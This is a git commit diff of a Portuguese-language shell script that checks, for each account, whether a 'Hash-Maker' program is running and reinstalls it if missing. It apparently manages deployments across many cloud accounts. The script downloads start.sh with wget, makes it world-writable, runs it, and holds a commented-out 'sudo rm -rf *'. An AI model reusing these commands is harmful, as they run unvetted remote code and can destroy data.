9800565589b68963d4058d56b6acf8da7e105b64
robotpack <73000997+robotpack@users.noreply.github.com>
2020-10-23 20:49:22 -0300

    Update sinaldevida.sh

--- sinaldevida.sh
+++ sinaldevida.sh
@@ -22,17 +22,22 @@ do
 
   if echo "$conta" | grep -q "$1"; then
 
-     email=$conta
+      email=$conta
 
-     command=""
-     command=" ${command} echo -e '"${verde}"'$data $conta ON'"${padrao}"' ;"
-     command=" ${command} [ ! -e 'CORE/build/Hash-Maker' ]  && echo -e '"${vermelho}"'$data $conta Hash-Maker erro!'"${padrao}"' ;"
-     command=" ${command} [ ! -e '.customize_environment' ] && echo -e '"${vermelho}"'$data $conta .customize_environment erro!'"${padrao}"' ;"
+	     command=""
+	     command=" ${command} echo -e '"${verde}"' "
+	     command=" ${command} $data "'$(pwd)'" $conta ON "'$(ps -o etime= -C "Hash-Maker")'"  "
+	     command=" ${command} '"${padrao}"' ;"
+	     command=" ${command} [ ! -e 'CORE/build/Hash-Maker' ]  && echo -e '"${vermelho}"'$data $conta Hash-Maker erro!'"${padrao}"' ;"
+	     command=" ${command} [ ! -e '.customize_environment' ] && echo -e '"${vermelho}"'$data $conta .customize_environment erro!'"${padrao}"' ;"
 
-     command=" ${command} [ ! -e 'CORE/build/Hash-Maker' ] || [ ! -e '.customize_environment' ] && wget -q -N https://raw.githubusercontent.com/robotpack/scripts/master/start.sh &&"
-     command=" ${command} chmod 777 start.sh && ./start.sh $conta &&"
-     command=" ${command} echo -e '"${verde}"'$data $conta Install ok!'"${padrao}"' ;"
-     command=" ${command} sleep 1 ; exit"
+	     command=" ${command} [ ! -e 'CORE/build/Hash-Maker' ] || [ ! -e '.customize_environment' ] &&"
+	     #command=" ${command} sudo rm -rf * &&"
+	     command=" ${command} wget -q -N https://raw.githubusercontent.com/robotpack/scripts/master/start.sh &&"
+	     command=" ${command} chmod 777 start.sh && ./start.sh $conta &&"
+	     command=" ${command} echo -e '"${verde}"'$data $conta Install ok!'"${padrao}"' ;"
+	     command=" ${command} sleep 1 ; exit"
+
 
      echo
      echo $conta
